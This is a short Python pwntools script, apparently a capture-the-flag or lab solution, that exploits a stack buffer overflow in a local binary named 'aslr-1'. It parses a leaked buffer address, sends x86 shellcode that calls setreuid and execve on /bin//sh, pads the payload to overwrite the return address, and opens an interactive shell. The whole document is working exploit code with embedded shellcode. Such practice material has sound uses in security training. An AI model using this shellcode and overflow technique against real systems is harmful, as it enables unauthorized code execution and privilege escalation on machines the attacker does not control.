#!/usr/bin/env python
from pwn import *

p= process("./aslr-1")
shell='j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2j\x0bX\x99Rhn/shh//biT[\xcd\x80'

l = p.recvline()
print(l)
buff_addr=(l.split('at ')[1])
print(buff_addr)
buf=buff_addr.strip('\n')
print(buf)
buff=int(buf,16)
print(type(buff))
print(buff)

#string=shell+"A"*(0x88+4 - len(shell)) + p32(buff)
string=shell+"A"*(0x88 - len(shell))+"AAAA" + p32(buff)
p.sendline(string)
p.interactive()

